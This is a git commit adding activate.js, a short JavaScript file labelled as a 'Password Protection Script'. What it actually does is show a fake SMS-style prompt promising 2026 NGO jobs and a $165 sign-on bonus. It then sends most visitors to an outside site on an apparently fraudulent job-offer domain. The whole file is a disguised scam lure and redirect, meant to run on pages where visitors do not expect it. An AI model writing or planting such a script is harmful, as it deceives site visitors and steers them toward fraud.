811475656700bfec11b41749356124f16923a7ca
Hjiosse <gogeakoti@gmail.com>
2026-03-26 12:43:10 +0100

    Create activate.js

---
+++ activate.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'APPLY NOW'
+password = prompt(
+  'SMS: Congratulations! You are eligible to Apply for 2026 NGO Jobs and Get $165 Sign-On Bonus. Press OK to APPLY.',
+  'APPLY NOW'
+);
+if (password != 'APPLY NOW') {
+  location.href = 'https://ongoing-jobs.cfd/Jobs-NGO-Jobs.html';
+  }
